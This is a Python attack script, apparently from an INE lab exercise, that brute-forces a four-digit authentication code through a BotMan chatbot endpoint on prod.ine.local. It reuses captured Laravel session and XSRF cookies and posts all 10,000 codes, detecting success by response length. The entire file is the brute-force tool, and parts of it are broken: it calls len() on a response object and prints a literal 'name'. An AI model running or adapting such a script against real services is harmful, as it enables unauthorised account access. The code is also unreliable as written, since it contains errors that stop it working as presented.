import requests

# Define the URL and tokens
url = "http://prod.ine.local/botman"
xsrf_token = "eyJpdiI6Inh1TStsS0ZCOU9JS2NpOGRudDBzTkE9PSIsInZhbHVlIjoid0lrSW9Qb2NKY1doUEtpU1FhVnZUUTJxVFFRRjNhYTRZeGJrckZRMlBrYTFSS3dMVkp2Y2FXVTF4elpGYWpiUSIsIm1hYyI6Ijc0YmUxMjE2MzhiZTM3OWZhOTMzYTBkODQ4ZDk3MTZiMDhmYWI1MGNkOTYyZTliYTg4ZjViNjRjNzAyYzk0ZGEifQ=="
laravel_session = "eyJpdiI6InhHVnlqenVRVHZGUzlzWERPMGRPdEE9PSIsInZhbHVlIjoiYlNrS1RkMDdZdUdXa081MXFyM25VRDVYQmprT2Y2ZVwvK1wvVlgxWFlyOUJSZHBcL1lxeWFIbDgzc3JIeEpTWjhzSSIsIm1hYyI6ImE2MWEyZmQ2ZTdkNDZlY2EyODViMTQ5MjM4MGIwODYwYWMyNDYzYjZlM2ViZTgwNzEyM2VhMWY1OGE2MTUyOWYifQ=="

# URL-encode the tokens (to match Burp's behavior)
import urllib.parse
xsrf_token_encoded = urllib.parse.quote(xsrf_token, safe='')
laravel_session_encoded = urllib.parse.quote(laravel_session, safe='')

# Define headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-XSRF-TOKEN": xsrf_token_encoded,
    "Content-Type": "multipart/form-data; boundary=---------------------------222821278428809990003442604295",
    "Origin": "http://prod.ine.local",
    "Referer": "http://prod.ine.local/botman/chat?conf=%7B%22chatServer%22%3A%22%2Fbotman%22%2C%22frameEndpoint%22%3A%22%2Fbotman%2Fchat%22%2C%22timeFormat%22%3A%22HH%3AMM%22%2C%22dateTimeFormat%22%3A%22m%2Fd%2Fyy%20HH%3AMM%22%2C%22title%22%3A%22Live%20Support%22%2C%22cookieValidInDays%22%3A1%2C%22introMessage%22%3A%22Hey%20there!%20Welcome%20to%20the%20Chat%20Bot.%22%2C%22placeholderText%22%3A%22Send%20a%20message...%22%2C%22displayMessageTime%22%3Atrue%2C%22sendWidgetOpenedEvent%22%3Afalse%2C%22widgetOpenedEventData%22%3A%22%22%2C%22mainColor%22%3A%22%23456765%22%2C%22headerTextColor%22%3A%22%23333%22%2C%22bubbleBackground%22%3A%22%23ff76f4%22%2C%22desktopHeight%22%3A450%2C%22desktopWidth%22%3A370%2C%22mobileHeight%22%3A%22100%25%22%2C%22mobileWidth%22%3A%22300px%22%2C%22videoHeight%22%3A160%2C%22aboutLink%22%3A%22https%3A%22https%3A%2F%2Fbotman.io%22%2C%22aboutText%22%3A%22%22%2C%22chatId%22%3A%22%22%2C%22userId%22%3A%22%22%2C%22alwaysUseFloatingButton%22%3Afalse%2C%22wrapperHeight%22%3A450%7D",
    "Connection": "close"
}

# Define cookies
cookies = {
    "XSRF-TOKEN": xsrf_token_encoded,
    "laravel_session": laravel_session_encoded
}

# Define the multipart form data manually, including the boundary
multipart_data = (
    "-----------------------------222821278428809990003442604295\r\n"
    'Content-Disposition: form-data; name="driver"\r\n\r\n'
    'web\r\n'
    "-----------------------------222821278428809990003442604295\r\n"
    'Content-Disposition: form-data; name="userId"\r\n\r\n'
    'mzwg82\r\n'
    "-----------------------------222821278428809990003442604295\r\n"
    'Content-Disposition: form-data; name="message"\r\n\r\n'
    'auth_code_check\r\n'
    "-----------------------------222821278428809990003442604295\r\n"
    'Content-Disposition: form-data; name="attachment"\r\n\r\n'
    'null\r\n'
    "-----------------------------222821278428809990003442604295\r\n"
    'Content-Disposition: form-data; name="interactive"\r\n\r\n'
    '1\r\n'
    "-----------------------------222821278428809990003442604295--\r\n"
)
for code in range(0,10000):
    response = requests.post(url, headers=headers, data=multipart_data, cookies=cookies)

    if len(response) == 138:
        name = requests.post(url, headers=headers, data=multipart_data, cookies=cookies)
        print("name")
        response = requests.post(url, headers=headers, data=multipart_data, cookies=cookies)

    code = str(code).zfill(4)
    brute = (
        "-----------------------------222821278428809990003442604295\r\n"
        'Content-Disposition: form-data; name="driver"\r\n\r\n'
        'web\r\n'
        "-----------------------------222821278428809990003442604295\r\n"
        'Content-Disposition: form-data; name="userId"\r\n\r\n'
        'mzwg82\r\n'
        "-----------------------------222821278428809990003442604295\r\n"
        'Content-Disposition: form-data; name="message"\r\n\r\n'
        f'{code}\r\n'
        "-----------------------------222821278428809990003442604295\r\n"
        'Content-Disposition: form-data; name="attachment"\r\n\r\n'
        'null\r\n'
        "-----------------------------222821278428809990003442604295\r\n"
        'Content-Disposition: form-data; name="interactive"\r\n\r\n'
        '1\r\n'
        "-----------------------------222821278428809990003442604295--\r\n"
    )
    result = requests.post(url, headers=headers, data=brute, cookies=cookies)
    
    # Print the response status code and body

    if int(code) % 100 == 0:
        print(code)

    if  len(result.text) != 778:
        print("Response:", len(response.text))
        print("result :", len(result.text))

        print("the code is:",code)
        print("result :", result.text)
